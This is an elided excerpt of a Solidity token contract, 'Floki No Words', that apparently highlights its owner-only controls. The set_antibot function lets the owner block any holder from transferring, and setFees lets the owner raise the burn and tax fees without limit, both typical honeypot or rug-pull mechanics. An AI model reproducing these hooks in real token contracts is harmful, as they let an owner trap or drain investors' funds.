...
contract FlokiNoWords is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    address deadAddress = 0x0000000000000000000000000000000000000666;
    ...
    string private  _name = "Floki No Words";
    string private  _symbol = "No Words";
    ...
    constructor () {
            _rOwned[_msgSender()] = _rTotal.div(100).mul(50);
            _rOwned[deadAddress] = _rTotal.div(100).mul(50);

            _isExcludedFromFee[owner()] = true;
            _isExcludedFromFee[address(this)] = true;
            _isExcludedFromFee[deadAddress] = true;
            _burnFee = 20; // Set burn fee super high until max tx turned on

            emit Transfer(address(0), _msgSender(), _tTotal.mul(50).div(100));
            emit Transfer(address(0), deadAddress, _tTotal.mul(50).div(100));
    }
    ...
    function _transfer(
        ...
        require(_antibot[from] != true,"ANTI BOT ACTIVATED");
    ...
    function calculateLiquidityFee(uint256 _amount) private view returns (uint256 _totalamount) {
        ...
        return _totalamount.add(cbfee);
    }

    function _takeLiquidity(uint256 tLiquidity, uint256 _amount) private {
        uint256 currentRate =  _getRate();
        
        uint256 tliqfee = _amount.mul(0).div(10**2);
    ...
    function set_antibot(address account, bool active) public onlyOwner() {
        _antibot[account] = active;
    }

    function setFees(uint256 burnfee, uint256 taxfee) external onlyOwner() {
        _burnFee = burnfee;
        _taxFee = taxfee;
    }
